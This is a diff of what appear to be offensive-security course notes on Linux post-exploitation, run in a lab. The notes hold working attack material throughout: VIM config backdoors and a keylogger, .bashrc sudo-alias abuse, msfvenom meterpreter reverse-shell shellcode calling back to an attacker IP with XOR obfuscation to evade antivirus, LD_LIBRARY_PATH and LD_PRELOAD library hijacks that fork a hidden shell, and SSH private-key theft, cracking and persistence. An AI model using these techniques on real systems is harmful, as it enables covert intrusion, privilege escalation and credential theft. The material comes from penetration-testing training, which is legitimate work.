@@ -3709,11 +3709,11 @@ command (client) 1> listen 127.0.0.1:3389 172.16.51.21:3389
 
 ## User Configuration Files
 
-`.bash_profile` is executed when logging in to the system initially, via a serial console or SSH.
+- `.bash_profile` is executed when logging in to the system initially, via a serial console or SSH.
 
-`.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.
+- `.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.
 
-=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system to maintain persistence, escalate privileges
+=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system to maintain persistence, escalate privileges.
 
 ```bash
 echo "touch /tmp/bashtest.txt" >> ~/.bashrc
@@ -3721,13 +3721,16 @@ echo "touch /tmp/bashtest.txt" >> ~/.bashrc
 
 ### VIM Config Simple Backdoor
 
-To print a message to the user, use this command in the `.vimrc` file or within the editor:
+To print a message to the user, use `:echo "this is a test"` in the `.vimrc` file or within the editor:
 
-`:echo "this is a test"`
+Since VIM has access to the shell environment's variables, use:
 
-Since VIM has access to the shell environment's variables, we can use **$USER** to get the username or **$UID** to get the user's ID number.
+- `$USER` to get the username
+- `$UID` to get the user's ID number.
 
-The commands specified in the `.vimrc` file are executed when VIM is launched. => cause a user's VIM session to **perform unintended actions on their behalf** when VIM is run.
+The commands specified in the `.vimrc` file are executed when VIM is launched.
+
+=> Cause a user's VIM session to **perform unintended actions on their behalf** when VIM is run.
 
 To run **shell commands** from within the config file:
 
@@ -3735,22 +3738,25 @@ To run **shell commands** from within the config file:
 
 By default, VIM allows shell commands but some hardened environments have VIM configured to restrict them. (e.g., calling VIM with the `-Z` parameter on the command line)
 
-Putting our commands directly into the user's `.vimrc` file isn't stealthy, as a user modifying their own settings may accidentally discover the changes.
+Putting our commands directly into the user's `.vimrc` file isn't stealthy, as a user modifying their own settings may accidentally discover the changes:
 
-=> "Source" a shell script using the bash `source` command. This loads a specified shell script and runs it.
+- "Source" a shell script using the bash `source` command. This loads a specified shell script and runs it.
 
-"Import" other VIM configuration files into the user's current config with the `:source` command.
+- "Import" other VIM configuration files into the user's current config with the `:source` command.
 
-Note: Source call for loading a VIM configuration file is prepended with a **colon** and not an **exclamation point**, which is used for shell commands.
+Note:
 
-**VIM plugin directory**: All VIM config files (have a `.vim` extension) located in the user's `~/.vim/plugin` directory will be loaded when VIM is run.
+- Source call for loading a VIM configuration file is prepended with a **colon**
+
+- Shell commands is prepended with a **exclamation point**.
+
+**VIM plugin directory**: All VIM config files (have a `.vim` extension) located in the user's `~/.vim/plugin/` directory will be loaded when VIM is run.
 
 The `:silent` command mutes any debug output:
 
 `.vimrc` file
 
 `:silent !source ~/.vimrunscript`
-
 
 `/home/offsec/.vimrunscript` file
 
@@ -3759,15 +3765,15 @@ The `:silent` command mutes any debug output:
 echo "hacked" > /tmp/hacksrcout.txt
 ```
 
-We can gain root privileges if the user runs VIM as **root** or uses the `visudo` command
+We can gain root privileges if the user runs VIM as `root` or uses the `visudo` command.
 
-VIM handles its configuration files differently for a user **in a sudo context** depending on the distribution of Linux:
+VIM handles its configuration files differently for a user in a `sudo` context depending on the distribution of Linux:
 
-* On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file.
+- On a Ubuntu or Red Hat: VIM will use the current user's `.vimrc` configuration file.
 
-* On a Debian: VIM will use the root user's VIM configuration.
+- On a Debian: VIM will use the `root` user's VIM configuration.
 
-=> add an alias to the user's `.bashrc` file
+=> Add an alias to the user's `.bashrc` file
 
 `alias sudo="sudo -E"`
 
@@ -3777,7 +3783,7 @@ If we want the alias changes to go into effect right away:
 source ~/.bashrc
 ```
 
-In some cases, users are given limited sudo rights to run only specific programs.
+In some cases, users are given limited `sudo` rights to run only specific programs. This limited access can be set in the `/etc/sudoers` file.
 
 ```bash
 sudo -l
@@ -3785,25 +3791,28 @@ sudo -l
 
 `(root) NOPASSWD: /usr/bin/vim /opt/important.conf`
 
-This limited access can be set in the `/etc/sudoers` file with the same syntax. In this case, a password is not required for sudo access.
+In this case, a password is **not** required for `sudo` access. Run VIM and then enter `:shell` to gain a `root` shell automatically.
 
-Run VIM and then enter `:shell` to gain a root shell automatically. If a password was required, use the alias vector to gain root access with our backdoor script.
+If a password was required, use the `alias` vector to gain root access with our backdoor script.
 
-Note: Many administrators now require the use of `sudoedit` for modifying sensitive files. This process makes copies of the files for the user to edit and then uses `sudo` to overwrite the old files. It also prevents the editor itself from running as sudo.
+Note: Many admins now require the use of `sudoedit` for modifying sensitive files. This process makes copies of the files for the user to edit and then uses `sudo` to overwrite the old files. It also prevents the editor itself from running as `sudo`.
 
 ### VIM Config Simple Keylogger
 
-Create a keylogger to log any changes a user makes to a file => capturing sensitive data in configuration files or scripts.
+Create a keylogger to log any changes a user makes to a file.
 
-**autocommand** settings do not require the shell (even if the current system uses a restricted VIM environment that blocks any shell commands).
+=> Capturing sensitive data in configuration files or scripts.
 
 Use `:autocmd` in a VIM configuration file or in the editor to set actions for a collection of predefined events.
 
-E.g., VimEnter (entering VIM), VimLeave (leaving VIM), FileAppendPre (right before appending to a file), and **BufWritePost** (after writing a change buffer to a file).
+- `VimEnter` (entering VIM)
+- `VimLeave` (leaving VIM)
+- `FileAppendPre` (right before appending to a file)
+- `BufWritePost` (after writing a change buffer to a file)
 
-Perform our actions based on the **BufWritePost** event. This activates once a buffer has already been written to the intended file.
+Perform our actions based on the `BufWritePost` event. This activates once a buffer has already been written to the intended file.
 
-VIM supports the use of basic if statements in its configuration scripts.
+VIM supports the use of basic `if` statements in its configuration scripts.
 
 ```
 :if <some condition>
@@ -3813,12 +3822,13 @@ VIM supports the use of basic if statements in its configuration scripts.
 :endif
 ```
 
-With environment variables, check whether the user is running as **root**.
+With environment variables `$USER`, we can check whether the user is running as `root`.
 
-The "*" specifies that this action will be performed for all files being edited.
-=> could change this to match only files with a particular name or file extension.
+The `*` specifies that this action will be performed for all files being edited.
 
-Then use `:w!` to save the buffer contents.
+=> Change this to match only files with a particular name or file extension.
+
+Use `:w!` to save the buffer contents.
 
 `/home/offsec/.vim/plugin/settings.vim`.
 
@@ -3828,7 +3838,7 @@ Then use `:w!` to save the buffer contents.
 :endif
 ```
 
-It's also possible to run shell commands on an autocommand trigger. Just replace everything after "`:silent`" with "`!`" followed by a shell script name or shell command.
+To run shell commands on an **autocommand** trigger, replace everything after "`:silent`" with "`!`" followed by a shell script name or shell command
 
 
 ## Bypassing AV
@@ -3839,7 +3849,7 @@ Turn Kaspersky off
 sudo kesl-control --stop-t 1
 ```
 
-Decrypts the encrypted version of the EICAR file 
+Decrypts the encrypted version of the EICAR file
 
 ```bash
 sudo gpg -d eicar.txt.gpg > eicar.txt
@@ -3865,7 +3875,7 @@ Restore real-time protection
 sudo kesl-control --start-t 1
 ```
 
-Generate a 64-bit unencoded shellcode with msfvenom, which will act as a wrapper to load and run the shellcode.
+Generate a 64-bit unencoded shellcode, which will act as a wrapper to load and run the shellcode.
 
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
@@ -3880,7 +3890,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -
 
 // msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
 unsigned char buf[] = 
-"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9";
+"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89...";
 
 int main (int argc, char **argv) 
 {
@@ -3901,7 +3911,7 @@ gcc -o hack.out hack.c -z execstack
 ./hack.out
 ```
 
-Create an encoder program to perform an XOR operation on our payload string to produce the new obfuscated version.
+An encoder program to perform an `XOR` operation on our payload string to produce the new obfuscated version.
 
 `encoder.c`
 
@@ -3911,7 +3921,7 @@ Create an encoder program to perform an XOR operation on our payload string to p
 #include <unistd.h>
 
 // msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
-unsigned char buf[] = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31...";
+unsigned char buf[] = "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08...";
 
 int main (int argc, char **argv) 
 {
@@ -3962,35 +3972,43 @@ gcc -o hack2.out hack2.c -z execstack
 
 ## Shared Libraries
 
-When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order. When it finds a copy of the library it needs, it stops searching and loads the module it finds:
+When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order.
 
-1. Directories listed in the application's **RPATH** value.
-2. Directories specified in the **LD_LIBRARY_PATH** environment variable.
-3. Directories listed in the application's RUNPATH value.
+1. Directories listed in the application's `RPATH` value.
+2. Directories specified in the `LD_LIBRARY_PATH` environment variable.
+3. Directories listed in the application's `RUNPATH` value.
 4. Directories specified in `/etc/ld.so.conf`.
 5. System library directories: `/lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64`, and potentially others.
 
+When it finds a copy of the library it needs, it stops searching and loads the module it finds.
+
 ### Shared Library Hijacking via LD_LIBRARY_PATH
 
-After checking its internal **RPATH** values for hard coded paths, it then checks for an environment variable called **LD_LIBRARY_PATH**.
+After checking its internal `RPATH` values for hard coded paths, it then checks for an environment variable called `LD_LIBRARY_PATH`.
 
-Intended use cases include **testing new library versions** without modifying existing libraries or modifying the program's behavior temporarily for debugging purposes.
+Intended use cases include:
 
-=> Exploit a victim user's application by creating a malicious library and then use **LD_LIBRARY_PATH** to hijack the application's normal flow and execute our malicious code to escalate privileges.
+- Testing new library versions without modifying existing libraries
 
-For demo, we are explicitly setting the environment variable before each call. However, an attacker would insert a line in the user's `.bashrc` or `.bash_profile` to define the **LD_LIBRARY_PATH** variable so it is set automatically when the user logs in.
+- Modifying the program's behavior temporarily for debugging purposes.
 
-One difficulty is that on most modern systems, user environment variables are not passed on when using `sudo`. This setting is configured in the `/etc/sudoers` file by using the **env_reset** keyword as a default.
+=> Create a malicious library and then use `LD_LIBRARY_PATH` to hijack the library of a program that a victim is likely to run, especially as `sudo`.
 
-Some systems are configured to allow a user's environment to be passed on to sudo. These will have **env_keep** set instead.
+For demo, we are explicitly setting the environment variable before each call. However, an attacker would insert a line in the user's `.bashrc` or `.bash_profile` to define the `LD_LIBRARY_PATH` variable so it is set automatically when the user logs in.
 
-Bypass the **env_reset** setting with our `.bashrc` alias for the sudo command. 
+One difficulty is that on most modern systems, user environment variables are not passed on when using `sudo`.
+
+This setting is configured in the `/etc/sudoers` file by using the `env_reset` keyword as a default.
+
+Some systems are configured to allow a user's environment to be passed on to `sudo`. These will have `env_keep` set instead.
+
+Bypass the `env_reset` setting with our `.bashrc` alias for the sudo command. 
 
 `alias sudo="sudo -E"`
 
-As a normal user, it's not typically possible to read `/etc/sudoers` to know if env_reset is set, so it may be useful to create this alias setting regardless.
+As a normal user, it's not typically possible to read `/etc/sudoers` to know if `env_reset` is set, so it may be useful to create this alias setting regardless.
 
-A simple malicious shared library
+A simple malicious shared library:
 
 `hax.c`
 
@@ -4009,31 +4027,29 @@ void runmahpayload() {
 }
 ```
 
-**Constructor functions** are run when the library is first initialized in order to set up code for the library to use.
+`Constructor` functions are run when the library is first initialized to set up code for the library to use.
 
-We initially set the user's UID and GID to "0", which will make the user root if run in a sudo context.
+We set the user's UID and GID to `0`, which will make the user root if run in a `sudo` context.
 
-Compile our shared library
+Compile our shared library:
 
 ```bash
 gcc -Wall -fPIC -c -o hax.o hax.c
 gcc -shared -o libhax.so hax.o
 ```
 
-* -Wall: gives more verbose warnings when compiling.
-* -fPIC: use position independent code,  suitable for shared libraries since they are loaded in unpredictable memory locations.
-* -c: compile but not link the code
-* -shared: create a shared library from our object file.
+- `-Wall`: gives more verbose warnings when compiling.
+- `-fPIC`: use position independent code, suitable for shared libraries since they are loaded in unpredictable memory locations.
+- `-c`: compile but not link the code
+- `-shared`: create a shared library from our object file.
 
 Shared libraries in Linux naming convention may also include a version number appended to the end.
 
 E.g., `lib<libraryname>.so.1`
 
-To hijack the library of a program that a victim is likely to run, especially as sudo.
+User might run `top` command as `sudo` to display processes with elevated permissions.
 
-=> `top` command. User might run this as sudo in order to display processes with elevated permissions.
-
-Ideally, target a library that also allows the program to run correctly even after our exploit is run, but this may not always be possible.
+Ideally, target a library that also allows the program to run correctly even after our exploit is run.
 
 Give information on which libraries are being loaded when `top` is being run.
 
@@ -4050,35 +4066,38 @@ A library for error reporting called `LibGPG-Error` is likely to be loaded by th
 ```bash
 export LD_LIBRARY_PATH=/home/offsec/ldlib/
 cp libhax.so /home/offsec/ldlib/libgpg-error.so.0
-```
 
-To later turn off the malicious library functionality, unset the environment variable using the `unset` command.
-
-```bash
 top
 ```
 
-Our exploit fails miserably
+To later turn off the malicious library functionality, unset the environment variable using:
+
+```bash
+unset LD_LIBRARY_PATH
+```
+
+Our exploit **fails** miserably.
 
 ```
 top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
 top: relocation error: /lib/x86_64-linux-gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
 ```
 
-We're missing the symbol **gpgrt_lock_lock** with a version of **GPG_ERROR_1.0**.
+1. We're missing the symbol `gpgrt_lock_lock` with a version of `GPG_ERROR_1.0`.
 
-When loading a library, a program only wants to know that our library contains symbols of that name. It doesn't care anything about validating their type or use.
+When loading a library, a program only wants to know that our library contains symbols of that name. It doesn't validate their type or use.
 
-* -s: give a list of available symbols in the library.
-Not all of the listed symbols are needed since some of them refer to other libraries. The symbol it's looking for is tagged with GPG_ERROR_1.0.
+- `-s`: give a list of available symbols in the library.
 
-* --wide: force it to include the untruncated names of the symbols, as well as the full path to the original shared library file.
+- `--wide`: force it to include the untruncated names of the symbols, as well as the full path to the original shared library file.
+
+- Not all of the listed symbols are needed since some of them refer to other libraries. The symbol it's looking for is tagged with `GPG_ERROR_1.0.`
 
 ```bash
 readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
 ```
 
-```
+```C
 int gpgrt_onclose;
 int _gpgrt_putc_overflow;
 int gpgrt_feof_unlocked;
@@ -4087,9 +4106,11 @@ int gpgrt_fflush;
 int gpgrt_poll;
 ```
 
-Error message about the shared **library's version information** => **libgcrypt** does require version information in associated libraries (Not all supporting libraries require version information).
+2. We also receive an error message about the shared library's version information.
 
-=> A map file that identifies particular symbols as being associated with a given version of the library.
+Not all supporting libraries require version information. But `libgcrypt` does require version information in associated libraries.
+
+=> A **map file** that identifies particular symbols as being associated with a given version of the library.
 
 ```bash
 readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
@@ -4148,15 +4169,13 @@ export LD_LIBRARY_PATH=/home/offsec/ldlib/
 top
 ```
 
-In modern Linux distributions, a user's environment variables aren't normally passed to a sudo context.
+`LD_LIBRARY_PATH` environment variables are not passed even when we create an alias for sudo in the user's `.bashrc` file, i.e. replacing `sudo` with `sudo -E`.
 
-=> Create an alias for sudo in the user's `.bashrc` file replacing `sudo` with `sudo -E`. However, **some environment variables are not passed even with this approach**. E.g., LD_LIBRARY_PATH.
-
-Modify the alias to include our **LD_LIBRARY_PATH** variable explicitly `.bashrc`
+Modify the alias to include our `LD_LIBRARY_PATH` variable explicitly in `.bashrc`.
 
 `alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"`
 
-Source the `.bashrc` file to load the changes we made
+Source the `.bashrc` file to load the changes we made:
 
 ```bash
 source ~/.bashrc
@@ -4168,17 +4187,22 @@ sudo top
 
 ### Exploitation via LD_PRELOAD
 
-**LD_PRELOAD** is an environment variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library before any others.
+`LD_PRELOAD` is an environment variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library before any others.
 
 => Functions defined in this library are used before any with the **same method signature** that are defined in other libraries. => **function hooking**
 
-A **method signature** is the information that a program needs to define a method. It consists of the value type the method will return, the method name, a listing of the parameters it needs, and each of their data types.
+A **method signature** is the information that a program needs to define a method. It consists of:
 
-Sudo will explicitly **ignore** the **LD_PRELOAD** environment variable for a user unless the user's real UID is the same as their effective UID.
+- The value type the method will return
+- The method name, a listing of the parameters it needs, and each of their data types.
 
-Find an application that the victim is likely to frequently use (with sudo) => `cp` utility 
+`Sudo` will explicitly **ignore** the `LD_PRELOAD` environment variable for a user unless the user's real UID is the same as their effective UID.
 
-Run `ltrace` to get a list of library function calls it uses during normal operation (`ltrace` is not installed by default on all Linux distributions.)
+Find an application that the victim is likely to frequently use (with `sudo`) => `cp` utility 
+
+Run `ltrace` to get a list of library function calls it uses during normal operation
+
+Note: `ltrace` is not installed by default on all Linux distributions.
 
 ```bash
 ltrace cp
@@ -4193,11 +4217,9 @@ fclose(0x7f717f0c0680)      = 0
 +++ exited (status 1) +++
 ```
 
-In a real-world scenario, it is ideal to run this on the target machine if possible to ensure that the library calls correctly match the target's system and program configuration.
+It is ideal to run this on the target machine if possible to ensure that the library calls correctly match the target's system and program configuration.
 
-`geteuid` function is a good candidate because it seems to only be called once during the application run, which limits how frequently our code will be executed.
-
-=> limit redundant shells.
+To limit redundant shells, `geteuid` function is a good candidate because it seems to only be called once during the application run, which limits how frequently our code will be executed.
 
 It takes no parameters and returns the user's UID number.
 
@@ -4214,50 +4236,54 @@ It takes no parameters and returns the user's UID number.
 #include <unistd.h>
 
 // msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=1337 -f c
-char buf[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6...";
+char buf[] = "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48...";
 
 uid_t geteuid(void)
 {
     typeof(geteuid) *old_geteuid;
     old_geteuid = dlsym(RTLD_NEXT, "geteuid");
     if (fork() == 0)
-        {
-            intptr_t pagesize = sysconf(_SC_PAGESIZE);
-            if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
-                 pagesize, PROT_READ|PROT_EXEC)) {
-                    perror("mprotect");
-                    return -1;
-                }
-            int (*ret)() = (int(*)())buf;
-            ret();
-        }
-        else
-        {
-            printf("HACK: returning from function...\n");
-            return (*old_geteuid)();
-        }
-        printf("HACK: Returning from main...\n");
-        return -2;
+    {
+        intptr_t pagesize = sysconf(_SC_PAGESIZE);
+        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
+                pagesize, PROT_READ|PROT_EXEC)) {
+                perror("mprotect");
+                return -1;
+            }
+        int (*ret)() = (int(*)())buf;
+        ret();
+    }
+    else
+    {
+        printf("HACK: returning from function...\n");
+        return (*old_geteuid)();
+    }
+    printf("HACK: Returning from main...\n");
+    return -2;
 }
 ```
 
 Use the `dlsym` function to get the memory address of the original version of the `geteuid` function. It will skip our version of the function and find the next one, which should be the original version loaded by the program the user called.
 
-If we use it as-is, when we run our target application, it will stop and wait for our shell to return before continuing. => The `cp` program will stall => raise suspicion.
+If we use it as-is, when we run our target application, it will stop and wait for our shell to return before continuing, i.e. the `cp` program will stall, which raise suspicion.
 
 Ideally, we want the program to return right away, but still run our shell in the background.
 
 => Create a new process for our shell by using the `fork` method, which creates a new process by duplicating the parent process.
 
-If the result of the fork call is zero, we are running inside the newly created child process, and can run our shell. Otherwise, it will return the expected value of geteuid to the original calling program so it can continue as intended.
+- If the result of the fork call is `0`, we are running inside the newly created child process, and can run our shell.
 
-The final 2 lines provide a meaningless return value in case the code reaches that point, which realistically should never happen.
+- Otherwise, it will return the expected value of `geteuid` to the original calling program so it can continue as intended.
+
+The final two lines provide a meaningless return value in case the code reaches that point, which realistically should never happen.
        
-The code within the fork branch checks that the shellcode resides on an executable memory page before executing it.
+The code within the `fork` branch checks that the shellcode resides on an **executable** memory page before executing it.
 
-`-f PIC` compilation flag relocates our shellcode to the library `.data` section in order to make it position independent. Specifically, the code gets the size of a memory page so it knows how much memory to access.
+`-f PIC` compilation flag relocates our shellcode to the library `.data` section to make it position independent.
 
-It then changes the page of memory that contains our shellcode and makes it executable using **mprotect**. + setting its access properties to **PROT_READ** and **PROT_EXEC**, which makes our code readable and executable.
+Specifically, the code gets the size of a memory page so it knows how much memory to access.
+
+It then changes the page of memory that contains our shellcode and makes it executable using `mprotect` and setting its access properties to `PROT_READ` and `PROT_EXEC`, which makes our code readable and executable.
 
 ```bash
 gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c
@@ -4269,13 +4295,15 @@ export LD_PRELOAD=/home/offsec/evil_geteuid.so
 cp /etc/passwd /tmp/testpasswd
 ```
 
-To elevate our privileges
+To elevate our privileges:
 
-The dynamic linker ignores LD_PRELOAD when the user's effective UID (EUID) does not match its real UID, e.g., when running commands as sudo.
+The dynamic linker ignores `LD_PRELOAD` when the user's effective UID (EUID) does not match its real UID, e.g., when running commands as `sudo`.
 
-We might be lucky and have `env_keep+=LD_PRELOAD` set in `/etc/sudoers`, but it's not likely. The env_keep setting specifically allows certain environment variables to be passed into the sudo session when calls are made. By default this is turned off.
+We might be lucky and have `env_keep+=LD_PRELOAD` set in `/etc/sudoers`, but it's not likely.
 
-To explicitly set LD_PRELOAD when calling sudo in `.bashrc`.
+The `env_keep` setting specifically allows certain environment variables to be passed into the `sudo` session when calls are made. By default this is turned off.
+
+Explicitly set `LD_PRELOAD` when calling sudo in `.bashrc`.
 
 `alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"`
 
@@ -4295,11 +4323,11 @@ Some systems require public key authentication to connect via SSH.
 
 ### SSH Keys
 
-Typically, a user's SSH key will have permissions set to **600**.
+Typically, a user's SSH key will have permissions set to `600`.
 
 In Linux, private keys are named `id_rsa` by default.
 
-Finding private keys on the system
+Finding private keys
 
 ```bash
 find /home/ -name "id_rsa"
@@ -4315,30 +4343,30 @@ cat /home/linuxvictim/svuser.key
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
+...
 ```
 
-- The "Proc-Type" header: the key is encrypted.
-- The "DEK-Info" header: the encryption type is "AES-128-CBC".
+- The `Proc-Type` header indicates that the key is encrypted.
 
-Inspecting the `/etc/passwd` file => no **svuser** account => it's not likely that the key is for this machine.
+- The `DEK-Info` header indicates that the encryption type is `AES-128-CBC`.
 
-Find machines that have been connected to recently
+By inspecting the `/etc/passwd` file, there is no `svuser` account => it's not likely that the key is for this machine.
+
+Find machines that have been connected to recently:
 
 ```bash
 cat /home/linuxvictim/.ssh/known_hosts
 ```
 
-The system has the **HashKnownHosts** setting enabled in `/etc/ssh/ssh_config`, => entries in the `known_hosts` file are hashed.
+The system has the `HashKnownHosts` setting enabled in `/etc/ssh/ssh_config` => entries in the `known_hosts` file are hashed.
 
-Checking the user's `~/.bash_history` file
+Check the user's `~/.bash_history` file
 
 ```bash
 tail /home/linuxvictim/.bash_history
 ```
 
-```bash
-ssh -i ./svuser.key svuser@controller
-```
+`ssh -i ./svuser.key svuser@controller`
 
 Crack the passphrase offline.
 
@@ -4347,23 +4375,21 @@ ssh2john svuser.key > svuser.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
 ```
 
-Connect to the controller VM
-
-```bash
-ssh -i ./svuser.key svuser@controller
-```
-
 ### SSH Persistence
 
 The `authorized_keys` file is a list of all of the public keys permitted to access the user's account on the current machine.
 
 => Insert our public key into a user's `~/.ssh/authorized_keys` file.
 
-Copying public keys from a remote system with **ssh-copy-id** requires authentication.
+1. Copying public keys from a remote system with `ssh-copy-id` requires authentication.
 
-If we have write access, simply append a new line to `authorized_keys`.
+```bash
+ssh-copy-id -i ~/.ssh/id_rsa.pub linuxvictim@linuxvictim
+```
 
-Note: Most Linux systems require **644** permissions on `authorized_keys`.
+2. If we have write access, simply append a new line to `authorized_keys`.
+
+Note: Most Linux systems require `644` permissions on `authorized_keys`.
 
 Create an SSH keypair on our Kali VM.
 
@@ -4371,10 +4397,9 @@ Create an SSH keypair on our Kali VM.
 ssh-keygen -t rsa
 ```
 
-The default values for the file path is our `~/.ssh/` directory:
-
+The default values:
+- `~/.ssh/` directory for the file path
 - `id_rsa` for the private key
-
 - `id_rsa.pub` for the public key.
 
 ```bash
@@ -4395,7 +4420,7 @@ ssh linuxvictim@linuxvictim
 
 ### SSH Hijacking with ControlMaster
 
-SSH hijacking == The use of an existing SSH connection to gain access to another machine.
+**SSH hijacking**: Use of an existing SSH connection to gain access to another machine.
 
 2 of the most common methods use the **ControlMaster** feature or the **ssh-agent**.
 
